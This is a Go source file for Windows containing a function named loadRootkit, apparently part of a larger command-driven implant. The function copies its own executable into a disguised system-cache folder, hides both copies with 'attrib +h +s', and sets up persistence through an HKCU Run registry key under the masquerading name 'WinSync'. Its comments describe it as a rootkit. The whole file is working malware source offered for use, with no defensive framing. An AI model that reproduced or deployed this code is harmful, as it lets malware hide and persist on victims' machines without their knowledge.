//go:build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// Windows user-mode rootkit:
//   - copies itself to a system-looking location
//   - marks the file hidden + system (attrib +h +s) so it vanishes from Explorer/dir
//   - persists via a Run key under a masquerading name
//   - the hidden copy runs on next boot, appearing as a system component
func loadRootkit(c Cmd) Result {
	name := str(c.Args["name"])
	if name == "" {
		name = "WinSync"
	}
	if !strings.HasSuffix(strings.ToLower(name), ".exe") {
		name += ".exe"
	}

	base := os.Getenv("LOCALAPPDATA")
	if base == "" {
		base = os.TempDir()
	}
	dir := filepath.Join(base, "Microsoft", "Windows", "INetCache")
	os.MkdirAll(dir, 0755)
	dst := filepath.Join(dir, name)

	exe, err := os.Executable()
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	if err := copyFile(exe, dst); err != nil {
		return Result{OK: false, Err: "copy: " + err.Error()}
	}

	// hide both the original and the planted copy
	newCmd("attrib", "+h", "+s", dst).Run()
	newCmd("attrib", "+h", "+s", exe).Run()

	newCmd("reg", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "WinSync", "/t", "REG_SZ", "/d", dst, "/f").Run()

	return Result{OK: true, Out: fmt.Sprintf(
		"windows rootkit: planted %s (attrib +h +s), registry Run key 'WinSync' set. "+
			"Hidden from Explorer and dir. Runs as WinSync.exe after reboot.", dst)}
}